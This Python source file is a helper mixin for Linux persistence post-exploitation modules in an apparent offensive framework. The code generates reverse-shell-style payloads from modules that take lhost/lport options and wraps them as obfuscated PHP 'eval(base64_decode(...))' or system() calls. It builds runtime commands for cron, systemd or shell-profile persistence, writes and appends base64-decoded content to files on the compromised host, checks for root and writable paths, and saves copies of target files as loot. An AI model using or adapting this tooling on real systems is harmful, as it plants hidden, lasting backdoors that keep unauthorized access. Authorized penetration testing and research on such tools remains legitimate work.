#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared helpers for Linux shell persistence post modules."""

from __future__ import annotations

import base64
import importlib
import os
import shlex
import time
from typing import Optional

from core.framework.failure import FailureType, ProcedureError
from core.output_handler import print_good, print_status, print_warning
from lib.post.file import File
from lib.post.linux.session import LinuxSessionMixin


PERSISTENCE_AGENT = {
    "risk": "destructive",
    "effects": ["target_modification", "config_changes"],
    "expected_requests": 2,
    "reversible": False,
    "approval_required": True,
    "produces": ["risk_signals"],
}


class LinuxPersistenceMixin(File):
    """Payload generation, remote file I/O, and loot backup for persistence modules."""

    def _opt(self, option) -> str:
        return str(option.value if hasattr(option, "value") else option or "").strip()

    def _load_payload_module(self, import_path: str):
        normalized = import_path.replace("/", ".").strip(".")
        module_path = f"modules.{normalized}"
        mod = importlib.import_module(module_path)
        cls = getattr(mod, "Module", None)
        if not cls:
            raise ProcedureError(FailureType.ConfigurationError, f"No Module class in {module_path}")
        instance = cls(framework=self.framework)
        for name in ("lhost", "lport", "rhost", "rport", "encoder", "transform", "obfuscator"):
            if hasattr(self, name) and hasattr(instance, name):
                value = getattr(self, name)
                if hasattr(value, "value"):
                    value = value.value
                if value not in (None, ""):
                    instance.set_option(name, value)
        return instance

    def _generate_payload(self) -> str:
        path = self._opt(getattr(self, "payload_path", ""))
        if not path:
            raise ProcedureError(FailureType.ConfigurationError, "payload_path is required")
        payload_mod = self._load_payload_module(path)
        if not hasattr(payload_mod, "generate"):
            raise ProcedureError(FailureType.ConfigurationError, f"{path} has no generate() method")
        generated = payload_mod.generate()
        if not generated or not isinstance(generated, str):
            raise ProcedureError(FailureType.Unknown, f"Failed to generate payload from {path}")
        return generated.strip()

    def _target_name(self) -> str:
        target = getattr(self, "target", "PHP")
        return self._opt(target) or "PHP"

    def _get_embedded_payload(self, encoded: str) -> str:
        if self._target_name() == "PHP":
            b64 = base64.b64encode(encoded.encode("utf-8")).decode("ascii")
            return f'eval(base64_decode("{b64}"));'
        escaped = encoded.replace("\\", "\\\\").replace('"', '\\"')
        return f'system("{escaped}");'

    def _php_file_content(self, encoded: str) -> str:
        embedded = self._get_embedded_payload(encoded)
        return f"<?php {embedded} ?>\n"

    def _runtime_command(self, encoded: str) -> str:
        """Shell command suitable for cron/systemd/profile (wraps PHP payloads)."""
        if self._target_name() == "PHP":
            b64 = base64.b64encode(encoded.encode("utf-8")).decode("ascii")
            return f'php -r \'eval(base64_decode("{b64}"));\''
        return encoded

    def _is_writable(self, path: str) -> bool:
        quoted = shlex.quote(path)
        output = self.linux_execute(f"test -w {quoted} && echo writable")
        return "writable" in (output or "")

    def _is_root(self) -> bool:
        output = self.linux_execute("id -u 2>/dev/null")
        return (output or "").strip() == "0"

    def _write_remote_file(self, path: str, content: str, mode: str = "0644") -> bool:
        normalized = content.replace("\r\n", "\n").replace("\r", "\n")
        payload_b64 = base64.b64encode(normalized.encode("utf-8")).decode("ascii")
        path_q = shlex.quote(path)
        script = (
            "set -e\n"
            f"target={path_q}\n"
            'target_dir=$(dirname "$target")\n'
            'mkdir -p "$target_dir" 2>/dev/null || true\n'
            'tmp=$(mktemp)\n'
            "trap 'rm -f \"$tmp\"' EXIT\n"
            f"echo '{payload_b64}' | base64 -d > \"$tmp\"\n"
            f"chmod {mode} \"$tmp\"\n"
            'mv "$tmp" "$target"\n'
            'test -f "$target"\n'
        )
        self.linux_execute(script)
        return self.file_exist(path)

    def _append_remote_line(self, path: str, line: str) -> bool:
        line_b64 = base64.b64encode((line.rstrip("\n") + "\n").encode("utf-8")).decode("ascii")
        path_q = shlex.quote(path)
        script = (
            "set -e\n"
            f"target={path_q}\n"
            'target_dir=$(dirname "$target")\n'
            'mkdir -p "$target_dir" 2>/dev/null || true\n'
            'touch "$target"\n'
            f"echo '{line_b64}' | base64 -d >> \"$target\"\n"
        )
        self.linux_execute(script)
        return self.file_exist(path)

    def _backup_to_loot(self, remote_path: str, original: str, tag: str) -> Optional[str]:
        ts = int(time.time())
        safe = tag.replace("/", "_").replace(" ", "_")
        rel = os.path.join("loot", f"{safe}_backup_{ts}.txt")
        header = f"# Backup of {remote_path}\n\n"
        if self.write_out_dir(rel, header + original, quiet=True):
            print_good(f"Backup saved to output/{rel}")
            return rel
        print_warning(f"Could not save backup for {remote_path}")
        return None

    def _maybe_backup(self, path: str, tag: str) -> None:
        if not self.file_exist(path):
            return
        print_status(f"Backing up existing {path}...")
        original = self.read_file(path)
        if original:
            self._backup_to_loot(path, original, tag)

    def _writable_target(self, file_path: str, directory: str) -> bool:
        if self.file_exist(file_path):
            return self._is_writable(file_path)
        return self._is_writable(directory.rstrip("/") or "/")
